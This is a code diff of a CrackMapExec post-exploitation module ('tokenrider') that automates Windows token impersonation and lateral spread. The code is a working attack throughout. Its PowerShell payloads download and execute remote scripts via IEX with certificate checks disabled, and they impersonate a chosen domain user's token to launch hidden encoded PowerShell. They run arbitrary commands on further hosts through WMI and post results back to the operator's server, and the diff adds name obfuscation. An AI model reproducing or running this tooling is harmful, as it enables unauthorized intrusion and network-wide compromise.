@@ -1,5 +1,5 @@
 from StringIO import StringIO
-from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script
+from cme.helpers import create_ps_command, gen_random_string, obfs_ps_script, get_ps_script
 from base64 import b64encode
 import sys
 import os
@@ -16,18 +16,16 @@ class CMEModule:
         Module by @byt3bl33d3r
     '''
 
-    name = 'token_rider'
+    name = 'tokenrider'
 
     description = 'Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials'
-
-    chain_support = True
 
     def options(self, context, module_options):
         '''
             TARGET   Target machine(s) to execute the command on (comma seperated)
             USER     User to impersonate
             DOMAIN   Domain of the user to impersonate
-            COMMAND  Command to execute on the target system(s) (Required if CMDFILE isn't specified)
+            CMD      Command to execute on the target system(s) (Required if CMDFILE isn't specified)
             CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
         '''
 
@@ -35,21 +33,20 @@ class CMEModule:
             context.log.error('TARGET, USER and DOMAIN options are required!')
             sys.exit(1)
 
-        if not 'COMMAND' in module_options and not 'CMDFILE' in module_options:
-            context.log.error('COMMAND or CMDFILE options are required!')
+        if not 'CMD' in module_options and not 'CMDFILE' in module_options:
+            context.log.error('CMD or CMDFILE options are required!')
             sys.exit(1)
 
-        if 'COMMAND' in module_options and 'CMDFILE' in module_options:
-            context.log.error('COMMAND and CMDFILE are mutually exclusive!')
+        if 'CMD' in module_options and 'CMDFILE' in module_options:
+            context.log.error('CMD and CMDFILE are mutually exclusive!')
             sys.exit(1)
 
         self.target_computers = ''
         self.target_user = module_options['USER']
         self.target_domain = module_options['DOMAIN']
 
-        if 'COMMAND' in module_options:
-            self.command = module_options['COMMAND']
-
+        if 'CMD' in module_options:
+            self.command = module_options['CMD']
         elif 'CMDFILE' in module_options:
             path = os.path.expanduser(module_options['CMDFILE'])
 
@@ -58,25 +55,28 @@ class CMEModule:
                 sys.exit(1)
 
             with open(path, 'r') as cmdfile:
-                self.command = cmdfile.read().strip() 
+                self.command = cmdfile.read().strip()
 
         targets = module_options['TARGET'].split(',')
         for target in targets:
             self.target_computers += '"{}",'.format(target)
         self.target_computers = self.target_computers[:-1]
 
+        self.obfs_name = gen_random_string()
+
         #context.log.debug('Target system string: {}'.format(self.target_computers))
 
-    def launcher(self, context, command):
+    def on_admin_login(self, context, connection):
+
         second_stage = '''
         [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
-        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/TokenRider.ps1');'''.format(server=context.server, 
-                                                                                                            addr=context.localip, 
+        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/TokenRider.ps1');'''.format(server=context.server,
+                                                                                                            addr=context.localip,
                                                                                                             port=context.server_port)
         context.log.debug(second_stage)
 
-        #Main launcher
-        launcher = '''
+        #Main payload
+        payload = '''
         function Send-POSTRequest {{
             [CmdletBinding()]
             Param (
@@ -94,7 +94,7 @@ class CMEModule:
         }}
 
         IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-TokenManipulation.ps1');
-        $tokens = Invoke-TokenManipulation -Enum;
+        $tokens = Invoke-{obfs_func} -Enum;
         foreach ($token in $tokens){{
             if ($token.Domain -eq "{domain}" -and $token.Username -eq "{user}"){{
 
@@ -103,69 +103,32 @@ class CMEModule:
                 $post_back = $post_back + $token_desc;
                 Send-POSTRequest $post_back
 
-                Invoke-TokenManipulation -Username "{domain}\\{user}" -CreateProcess "cmd.exe" -ProcessArgs "/c powershell.exe -exec bypass -window hidden -noni -nop -encoded {second_stage}";
+                Invoke-{obfs_func} -Username "{domain}\\{user}" -CreateProcess "cmd.exe" -ProcessArgs "/c powershell.exe -exec bypass -window hidden -noni -nop -encoded {command}";
                 return
             }}
         }}
 
-        Send-POSTRequest "User token not present on system!"'''.format(second_stage=b64encode(second_stage.encode('UTF-16LE')),
+
+        Send-POSTRequest "User token not present on system!"'''.format(obfs_func=self.obfs_name,
+                                                                       command=b64encode(second_stage.encode('UTF-16LE')),
                                                                        server=context.server,
                                                                        addr=context.localip,
                                                                        port=context.server_port,
                                                                        user=self.target_user,
                                                                        domain=self.target_domain)
 
-        return create_ps_command(launcher)
+        context.log.debug(payload)
+        payload = create_ps_command(payload)
+        connection.execute(payload, methods=['atexec', 'smbexec'])
+        context.log.success('Executed payload')
 
-    def payload(self, context, command):
-        #This will get executed in the process that was created with the impersonated token
-        payload = '''
-        [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
-        function Send-POSTRequest {{
-            [CmdletBinding()]
-            Param (
-                [string] $data
-            )
-            $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
-            $request.Method = 'POST';
-            $request.ContentType = 'application/x-www-form-urlencoded';
-            $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
-            $request.ContentLength = $bytes.Length;
-            $requestStream = $request.GetRequestStream();
-            $requestStream.Write( $bytes, 0, $bytes.Length );
-            $requestStream.Close();
-            $request.GetResponse();
-        }}
-
-        $post_output = "";
-        $targets = @({targets});
-        foreach ($target in $targets){{
-            try{{
-                Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $target -ArgumentList "{command}";
-                $post_output = $post_output + "Executed command on $target! `n";
-            }} catch {{
-                $post_output = $post_output + "Error executing command on $target $_.Exception.Message `n";
-            }}
-        }}
-        Send-POSTRequest $post_output'''.format(server=context.server, 
-                                                addr=context.localip, 
-                                                port=context.server_port,
-                                                targets=self.target_computers,
-                                                command=command)
-
-        return payload
-
-    def on_admin_login(self, context, connection, launcher, payload):
-        connection.execute(launcher, methods=['smbexec', 'atexec'])
-        context.log.success('Executed launcher')
-
-    def on_request(self, context, request, launcher, payload):
+    def on_request(self, context, request):
         if 'Invoke-TokenManipulation.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
 
             with open(get_ps_script('PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read())
+                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                 request.wfile.write(ps_script)
 
         elif 'TokenRider.ps1' == request.path[1:]:
@@ -173,7 +136,45 @@ class CMEModule:
             request.end_headers()
 
             #Command to execute on the target system(s)
-            request.wfile.write(payload)
+            command_to_execute  = 'cmd.exe /c {}'.format(self.command)
+            #context.log.debug(command_to_execute)
+
+            #This will get executed in the process that was created with the impersonated token
+            elevated_ps_command = '''
+            [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
+            function Send-POSTRequest {{
+                [CmdletBinding()]
+                Param (
+                    [string] $data
+                )
+                $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
+                $request.Method = 'POST';
+                $request.ContentType = 'application/x-www-form-urlencoded';
+                $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
+                $request.ContentLength = $bytes.Length;
+                $requestStream = $request.GetRequestStream();
+                $requestStream.Write( $bytes, 0, $bytes.Length );
+                $requestStream.Close();
+                $request.GetResponse();
+            }}
+
+            $post_output = "";
+            $targets = @({targets});
+            foreach ($target in $targets){{
+                try{{
+                    Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $target -ArgumentList "{command}";
+                    $post_output = $post_output + "Executed command on $target! `n";
+                }} catch {{
+                    $post_output = $post_output + "Error executing command on $target $_.Exception.Message `n";
+                }}
+            }}
+            Send-POSTRequest $post_output'''.format(server=context.server,
+                                                    addr=context.localip,
+                                                    port=context.server_port,
+                                                    targets=self.target_computers,
+                                                    command=command_to_execute)
+
+            request.wfile.write(elevated_ps_command)
 
         else:
             request.send_response(404)
